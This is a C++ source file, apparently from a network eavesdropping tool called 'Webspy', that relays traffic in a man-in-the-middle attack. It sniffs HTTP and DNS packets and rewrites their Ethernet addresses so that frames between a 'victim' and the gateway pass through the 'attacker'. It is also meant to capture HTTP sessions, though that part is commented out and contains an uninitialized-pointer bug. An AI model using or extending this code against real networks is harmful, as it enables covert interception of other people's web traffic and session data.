/*
 * Pipe.cpp
 *
 *  Created on: 01/06/2015
 *      Author: Felipe Rodopoulos
 */

#include "Pipe.h"

std::queue<Packet>	Pipe::analyseBuffer;
TCPAssembler		Pipe::assembler;
pthread_t			Pipe::assemblerThread;
pthread_mutex_t 	Pipe::analyserMutex;
Crafter				Pipe::crafter;
Renderer*			Pipe::renderer;
long				Pipe::packetCount = 0;

Pipe::Pipe(){}

Pipe::~Pipe(){}

void Pipe::init(Renderer* rendererPtr){
	crafter.init(Globals::iface);
	renderer = rendererPtr;

	/*if(pthread_mutex_init(&analyserMutex, NULL) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}
	if(pthread_create(&analyserThread, nullptr, analyseHTTP, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init victim relayer thread\n");
		exit(EXIT_FAILURE);
	}*/

	if(pthread_create(&snifferThread, nullptr, connect, nullptr) < 0){
		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
		exit(EXIT_FAILURE);
	}

}

void* Pipe::connect(void* args){
	char filter[] = "tcp port 80 || tcp port 53 || udp port 53";
	Sniffer sniffer(filter);
	assembler.config(sniffer.getHandle());
	if(pthread_create(&assemblerThread, nullptr, initAssembler, nullptr) < 0){
		printf("Webspy::Pipe::connect > [ERRO] can't init assembler thread\n");
		exit(EXIT_FAILURE);
	}

	printf("Relay is on!\n");
	sniffer.listen(relay);
	return nullptr;
}

void* Pipe::initAssembler(void* args){
	assembler.start();
	return nullptr;
}

void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned char* rcvdPacket){
	if(!header) return;
	Packet* packet = new Packet(rcvdPacket, header->len);
	if(!memcmp( packet->ethernet->thaddr, Globals::attacker.mac, 6)){
		packetCount++;
		// From victim to gateway
		if(!memcmp(packet->ethernet->shaddr, Globals::victim.mac->ether_addr_octet,6)){
			memcpy(packet->ethernet->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
			memcpy(packet->ethernet->thaddr, Globals::gateway.mac->ether_addr_octet, 6);
			//printf("[packet] victim -> attacker -> gateway | Len: %d", packet->len);
			crafter.sendRaw(*packet);
			//assembler.assembly((pcap_pkthdr*)header, rcvdPacket);
			if(packet->isHTTP()){
				pthread_mutex_lock(&analyserMutex);
				//analyseBuffer.push(*packet);
				pthread_mutex_unlock(&analyserMutex);
				//printf(" | HTTP REQUEST");
			}
			//printf("\n");
		// From gateway to victim
		} else if(!memcmp(packet->ethernet->shaddr, Globals::gateway.mac->ether_addr_octet, 6)
				&& packet->ip->dst != Globals::attacker.ip){
			memcpy(packet->ethernet->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
			memcpy(packet->ethernet->thaddr, Globals::victim.mac->ether_addr_octet, 6);
			//printf("[ %ld ] gateway -> attacker -> victim | Len: %d", packetCount, packet->len);
			crafter.sendRaw(*packet);
			//assembler.assembly((pcap_pkthdr*)header, rcvdPacket);
			if(packet->isHTTP()){
				pthread_mutex_lock(&analyserMutex);
				//analyseBuffer.push(*packet);
				pthread_mutex_unlock(&analyserMutex);
				//printf(" | HTTP RESPONSE");
			}
			//printf("\n");
		}
	}
}

void* Pipe::analyseHTTP(void* args){
	while(1==1){
		if(!analyseBuffer.empty()){
			/*pthread_mutex_lock(&analyserMutex);
			Packet packet = analyseBuffer.front();
			analyseBuffer.pop();
			pthread_mutex_unlock(&analyserMutex);

			if(HTTP::readMethod((char*) packet.getPayload()) == HTTP_REQ){
				HTTP* newObject = new HTTP(
					packet.ip->dst,
					packet.tcp->dport,
					packet.getPayload()
				);
				if(renderer->isNewSession(newObject)){
					HTTPSession *session = new HTTPSession(newObject);
					renderer->addNewSession(session);
				} else{
					//HTTPSession* session = renderer->retrieveSession(newObject, HTTP_REQ);
					HTTPSession* session;
					session->newRequest(newObject);
				}
			} else { // IS RESPONSE
				//HTTPSession* session = renderer->retrieveSession(newObject, HTTP_RES);
				HTTPSession* session;
				session->addRequestResponse(
					packet.ip->src,
					packet.tcp->sport,
					packet.getPayloadLen(),
					packet.getPayload()
				);
			}*/
		}
	}
}

